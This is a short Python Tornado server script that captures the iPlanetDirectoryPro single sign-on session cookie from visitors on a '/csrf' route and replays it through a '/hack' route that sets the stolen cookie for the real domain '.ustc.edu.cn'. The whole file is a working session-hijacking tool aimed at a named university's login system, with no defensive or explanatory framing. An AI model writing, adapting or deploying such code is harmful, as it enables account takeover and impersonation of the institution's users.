__author__ = 'suquark'
import os
import tornado
from tornado.ioloop import IOLoop
import tornado.web
from tornado.web import RequestHandler, Application, authenticated
import time

ipc = ''
class csrf(RequestHandler):
    def get(self):
        globals()['ipc'] = self.get_cookie("iPlanetDirectoryPro")
        self.write(globals()['ipc'])
        
class hack(RequestHandler):
    def get(self):
        self.set_cookie("iPlanetDirectoryPro", ipc, domain='.ustc.edu.cn')

application = Application([
    (r"/csrf", csrf),
    (r"/hack", hack),
])


if __name__ == "__main__":
    application.listen(8888)
    IOLoop.instance().start()
